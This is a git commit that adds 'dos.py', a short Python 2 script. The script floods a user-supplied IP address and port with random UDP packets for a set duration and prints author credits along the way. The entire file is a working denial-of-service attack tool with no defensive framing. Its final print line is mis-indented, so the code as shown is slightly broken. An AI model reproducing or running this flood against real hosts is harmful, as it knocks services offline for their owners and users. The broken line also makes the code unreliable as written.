f4fd6b2c0db9b9fe2c4e733cb5ffd887dcd4e4be
koushikavula <koushikcool987@gmail.com>
2019-07-11 09:43:05 +0530

    Create dos.py

---
+++ dos.py
@@ -0,0 +1,24 @@
+import os
+import sys
+import time
+import random
+import socket
+
+print "Contributor:KoushikAvula"
+print "Profile:https://www.koushikavula.in"
+print "Github:https://github.com/koushikavula" 
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+bytes=random._urandom(1024)
+ip=raw_input("Target IP address:")
+port=input("Target Port:")
+dur=raw_input("Enter an duration:")
+timeout=time.time()+float(dur)
+sent=0
+
+while True:
+    if time.time()>timeout:
+        break
+    else:
+        sock.sendto(bytes,(ip,port))
+        sent=sent+1
+                print "Sent %s packets to %s IP address through %s port"%(sent,ip,port)
